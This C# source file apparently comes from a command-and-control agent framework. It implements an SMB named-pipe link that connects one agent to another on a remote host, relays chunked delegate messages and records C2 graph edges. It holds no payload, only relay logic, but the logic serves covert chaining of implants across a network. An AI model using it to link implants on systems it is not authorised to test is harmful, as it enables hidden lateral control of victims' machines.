using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using H.Pipes;
using H.Pipes.Args;
using System.Collections.Concurrent;
using System.Text;

namespace Workflow
{
    public class SmbLink
    {
        private PipeClient<SmbMessage> clientPipe { get; set; }
        public bool connected { get; set; }
        private string task_id { get; set; }
        private SmbLinkArgs args { get; set; }
        private string agent_id { get; set; }
        public string linked_agent_id { get; set; }
        private AutoResetEvent messageSuccess = new AutoResetEvent(false);
        private ConcurrentDictionary<string, StringBuilder> partialMessages =
            new ConcurrentDictionary<string, StringBuilder>();
        private ConcurrentDictionary<string, int> expectedSequence =
            new ConcurrentDictionary<string, int>();
        IDataBroker messageManager { get; set; }
        ILogger logger { get; set; }

        private const int ConnectionTimeoutMs = 30000;
        private const int MessageAckTimeoutMs = 15000;
        private const int ChunkSize = 32768;

        public SmbLink(
            IDataBroker messageManager,
            ILogger logger,
            SmbLinkArgs args,
            string agent_id,
            string task_id)
        {
            this.agent_id = agent_id;
            this.messageManager = messageManager;
            this.logger = logger;
            this.task_id = task_id;
            this.args = args;
        }

        public async Task<EdgeResponse> Link()
        {
            try
            {
                if (this.clientPipe == null || !this.connected)
                {
                    this.clientPipe = new PipeClient<SmbMessage>(
                        args.pipename, args.hostname);
                    this.clientPipe.MessageReceived +=
                        async (o, args) => await OnMessageReceive(args);
                    this.clientPipe.Connected +=
                        (o, _) => this.connected = true;
                    this.clientPipe.Disconnected +=
                        (o, _) => this.connected = false;

                    await clientPipe.ConnectAsync();

                    if (clientPipe.IsConnected)
                    {
                        this.connected = true;

                        if (!messageSuccess.WaitOne(ConnectionTimeoutMs))
                        {
                            return new EdgeResponse
                            {
                                task_id = task_id,
                                user_output =
                                    "Timed out waiting for agent UUID",
                                completed = true,
                                edges = new List<Edge>()
                            };
                        }

                        return new EdgeResponse
                        {
                            task_id = task_id,
                            user_output =
                                $"Established link with pipe.\r\n" +
                                $"{this.agent_id} -> " +
                                $"{this.linked_agent_id}",
                            completed = true,
                            edges = new List<Edge>
                            {
                                new Edge
                                {
                                    destination = this.linked_agent_id,
                                    source = this.agent_id,
                                    action = "add",
                                    c2_profile = "smb",
                                    metadata = string.Empty
                                }
                            }
                        };
                    }
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine($"Error in Link: {e}");

                return new EdgeResponse
                {
                    task_id = task_id,
                    user_output = e.ToString(),
                    completed = true,
                    edges = new List<Edge>()
                };
            }

            return new EdgeResponse
            {
                task_id = task_id,
                user_output = "Failed to establish link with pipe",
                completed = true,
                edges = new List<Edge>()
            };
        }

        private async Task OnMessageReceive(
            ConnectionMessageEventArgs<SmbMessage> args)
        {
            try
            {
                if (string.IsNullOrEmpty(linked_agent_id))
                {
                    linked_agent_id = args.Message.agent_guid;
                }

                switch (args.Message.message_type)
                {
                    case "success":
                        messageSuccess.Set();
                        break;

                    default:
                        string guid = args.Message.guid;
                        var messageBuilder =
                            this.partialMessages.GetOrAdd(
                                guid, _ => new StringBuilder());
                        int expected =
                            this.expectedSequence.GetOrAdd(guid, 0);

                        if (args.Message.sequence != expected)
                        {
                            DebugLog.Log(
                                $"SMB link chunk out of order for " +
                                $"{guid}: expected {expected}, " +
                                $"got {args.Message.sequence}");
                        }

                        this.expectedSequence[guid] = expected + 1;
                        messageBuilder.Append(
                            args.Message.delegate_message);

                        if (args.Message.final)
                        {
                            var dm = new DelegateMessage
                            {
                                c2_profile = "smb",
                                message = messageBuilder.ToString(),
                                uuid = args.Message.agent_guid,
                            };

                            this.messageManager.AddDelegateMessage(dm);
                            this.partialMessages.TryRemove(
                                guid, out _);
                            this.expectedSequence.TryRemove(
                                guid, out _);
                            messageSuccess.Set();
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                DebugLog.Log(
                    $"SMB link OnMessageReceive error: {ex.Message}");
            }
        }

        public async Task<bool> Unlink()
        {
            try
            {
                if (this.clientPipe != null)
                {
                    await this.clientPipe.DisconnectAsync();
                    await this.clientPipe.DisposeAsync();
                }

                this.connected = false;
                this.partialMessages.Clear();
                this.expectedSequence.Clear();

                return true;
            }
            catch (Exception ex)
            {
                DebugLog.Log($"SMB link Unlink error: {ex.Message}");
                return false;
            }
            finally
            {
                this.connected = false;
                this.partialMessages.Clear();
                this.expectedSequence.Clear();
            }
        }

        public async Task<bool> ForwardDelegateMessage(DelegateMessage dm)
        {
            try
            {
                var parts = dm.message
                    .SplitByLength(ChunkSize).ToList();

                string messageGuid = Guid.NewGuid().ToString();
                for (int i = 0; i < parts.Count; i++)
                {
                    var sm = new SmbMessage
                    {
                        guid = messageGuid,
                        message_type = "chunked_message",
                        agent_guid = agent_id,
                        delegate_message = parts[i],
                        final = (i == parts.Count - 1),
                        sequence = i,
                    };

                    await this.clientPipe.WriteAsync(sm);

                    if (!messageSuccess.WaitOne(MessageAckTimeoutMs))
                    {
                        DebugLog.Log(
                            $"SMB link ack timeout on chunk {i}/" +
                            $"{parts.Count}");
                        return false;
                    }
                }

                return true;
            }
            catch (Exception e)
            {
                DebugLog.Log(
                    $"SMB link ForwardDelegateMessage error: " +
                    $"{e.Message}");
                return false;
            }
        }
    }
}
